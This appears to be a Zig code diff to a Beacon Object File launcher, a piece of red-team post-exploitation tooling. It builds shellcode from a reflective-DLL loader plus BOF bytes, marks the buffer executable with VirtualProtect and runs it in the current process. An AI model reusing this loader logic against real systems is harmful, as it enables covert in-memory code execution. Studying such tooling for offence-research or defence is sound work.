@@ -22,10 +22,8 @@ pub export fn go(arg_data: ?[*]u8, arg_len: i32) callconv(.C) u8 {
 
     const dumpbin = blk: {
         if (beacon.dataLength(&parser) != 0) {
-            var len: i32 = 0;
-            if (beacon.dataExtract(&parser, &len)) |ptr| {
-                const str = ptr[0..@intCast(len - 1)];
-                if (std.mem.eql(u8, str, "-dumpbin")) break :blk true;
+            if (beacon.dataExtract(&parser, null)) |ptr| {
+                if (std.mem.eql(u8, std.mem.span(ptr), "-dumpbin")) break :blk true;
             }
         }
         break :blk false;
@@ -45,6 +43,16 @@ pub export fn go(arg_data: ?[*]u8, arg_len: i32) callconv(.C) u8 {
 
     // PID -1 is current process
     if (pid == -1) {
+        var old_protection: w32.DWORD = 0;
+        if (w32.VirtualProtect(
+            @constCast(shellcode_bytes.ptr),
+            4096,
+            w32.PAGE_EXECUTE_READ, // TODO: Do we need PAGE_EXECUTE_READWRITE? Verify in the debugger.
+            &old_protection,
+        ) == w32.FALSE) return 0xff;
+
+        _ = w32.FlushInstructionCache(w32.GetCurrentProcess(), shellcode_bytes.ptr, 4096);
+
         @as(*const fn () callconv(.C) void, @ptrCast(shellcode_bytes.ptr))();
         return 0;
     }
@@ -167,16 +175,6 @@ fn genShellcode(bof_bytes: []const u8) ![]const u8 {
         u8,
         &[_][]const u8{ fbs_bootstrap.getWritten(), rdi_shellcode_bytes, bof_launcher_bytes, bof_bytes },
     ) catch @panic("OOM");
-
-    var old_protection: w32.DWORD = 0;
-    if (w32.VirtualProtect(
-        shellcode_bytes.ptr,
-        4096,
-        w32.PAGE_EXECUTE_READ, // TODO: Do we need PAGE_EXECUTE_READWRITE? Verify in the debugger.
-        &old_protection,
-    ) == w32.FALSE) return error.VirtualProtectFailed;
-
-    _ = w32.FlushInstructionCache(w32.GetCurrentProcess(), shellcode_bytes.ptr, 4096);
 
     return shellcode_bytes;
 }
